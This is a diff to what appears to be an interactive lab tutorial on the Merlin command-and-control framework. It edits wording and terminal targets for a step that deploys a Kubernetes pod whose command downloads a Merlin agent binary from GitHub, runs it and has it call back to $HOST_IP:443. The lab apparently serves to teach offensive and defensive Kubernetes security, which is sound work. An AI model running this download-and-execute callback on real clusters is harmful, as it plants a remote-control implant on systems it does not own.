@@ -15,9 +15,10 @@ Start the server `./server`{{execute}}.
 To view the menu, run `help`{{execute}} and to see the list of modules run `use module <TAB>`.  
 *You can use the `TAB` in any place to see the list commands.  
 
-Let's continue and see examples2.  
+Let's continue and see examples.  
 
-Start this vulnerable container:  
+
+`Open`{{execute T3}}  new terminal on the master and tart this vulnerable container:  
 ```
 kubectl apply -f - <<EOF
 apiVersion: v1
@@ -29,7 +30,7 @@ spec:
   - name: priv-container
     image: ubuntu
     command: [ "sh", "-c", "apt update && apt install wget -y && wget https://github.com/g3rzi/katacodaScenario/releases/download/0.1/merlinAgent-Linux-x64 && chmod +x merlinAgent-Linux-x64 && ./merlinAgent-Linux-x64 -url https://$HOST_IP:443", "sleep infinity" ]
-EOF```{{execute T3}}  
+EOF```{{execute T2}}  
 
 
 
